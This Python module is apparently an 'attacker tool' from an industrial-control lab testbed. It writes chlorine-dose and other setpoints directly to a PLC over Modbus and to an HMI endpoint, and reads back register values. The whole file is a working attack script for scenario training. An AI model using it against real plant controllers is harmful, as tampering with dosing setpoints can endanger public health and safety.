"""Attacker tools for act-mode scenarios (vm-uta-attack). Lab use only.
  python -m swuapps.attack set ClDoseSetpoint 12
  python -m swuapps.attack scan"""
from __future__ import annotations

import argparse
import os
import json
from urllib.request import Request, urlopen
from urllib.parse import urlencode

from pymodbus.client import ModbusTcpClient

from .registers import MAP, SETPOINTS, READ_COUNT, READ_START, encode, from_block


def main() -> None:
    ap = argparse.ArgumentParser()
    sub = ap.add_subparsers(dest="cmd", required=True)
    s = sub.add_parser("set"); s.add_argument("tag", choices=sorted(SETPOINTS)); s.add_argument("value", type=float)
    h = sub.add_parser("hmi-set"); h.add_argument("tag", choices=sorted(SETPOINTS)); h.add_argument("value", type=float)
    sub.add_parser("hmi-scan")
    sub.add_parser("scan")
    a = ap.parse_args()
    if a.cmd in ("hmi-set", "hmi-scan"):
        base = os.environ.get("SWU_HMI_URL", "http://10.10.1.11:1881")
        if a.cmd == "hmi-scan":
            with urlopen(base + "/api/values", timeout=10) as response:
                print(response.read().decode())
        else:
            request = Request(base + "/set", data=urlencode({"tag": a.tag, "value": a.value}).encode())
            with urlopen(request, timeout=10) as response:
                if response.status != 200:
                    raise RuntimeError("HMI did not accept setpoint")
        return
    c = ModbusTcpClient(os.environ.get("SWU_PLC_HOST", "10.10.1.10"), port=int(os.environ.get("SWU_MODBUS_PORT", "502")))
    if not c.connect():
        raise ConnectionError("Lab scenario runner cannot reach PLC")
    try:
        if a.cmd == "set":
            rr = c.write_register(MAP[a.tag], encode(a.value))
            if rr.isError():
                raise RuntimeError(f"PLC rejected scenario setpoint: {rr}")
            print(json.dumps({"tag": a.tag, "value": a.value}))
        else:
            response = c.read_holding_registers(READ_START, count=READ_COUNT)
            if response.isError():
                raise RuntimeError(f"PLC read failed: {response}")
            print(json.dumps(from_block(response.registers)))
    finally:
        c.close()


if __name__ == "__main__":
    main()
